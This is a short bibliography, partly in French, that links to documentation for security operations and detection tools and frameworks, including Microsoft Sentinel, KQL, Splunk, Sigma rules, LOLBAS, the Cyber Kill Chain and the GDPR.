- Microsoft Learn – Microsoft Sentinel — <https://learn.microsoft.com/azure/sentinel/>
- Microsoft Learn – Advanced hunting (Defender XDR) — <https://learn.microsoft.com/defender-xdr/advanced-hunting-overview>
- Microsoft Learn – Kusto Query Language (KQL) — <https://learn.microsoft.com/kusto/query/>
- Microsoft Learn – Codes d'erreur Entra ID (AADSTS) — <https://learn.microsoft.com/entra/identity-platform/reference-error-codes>
- Microsoft Sysinternals – Sysmon — <https://learn.microsoft.com/sysinternals/downloads/sysmon>
- Splunk Documentation (SPL, Enterprise Security, CIM) — <https://docs.splunk.com/>
- IBM QRadar Documentation — <https://www.ibm.com/docs/en/qradar-common>
- Elastic Common Schema (ECS) — <https://www.elastic.co/guide/en/ecs/current/index.html>
- CrowdStrike – Falcon Platform — <https://www.crowdstrike.com/platform/>
- SigmaHQ – Sigma rules — <https://github.com/SigmaHQ/sigma>
- LOLBAS Project — <https://lolbas-project.github.io/>
- SOC-CMM – SOC Capability Maturity Model — <https://www.soc-cmm.com/>
- D. Bianco – The Pyramid of Pain — <https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html>
- Lockheed Martin – Cyber Kill Chain — <https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html>
- Règlement (UE) 2016/679 – RGPD — <https://eur-lex.europa.eu/eli/reg/2016/679/oj>
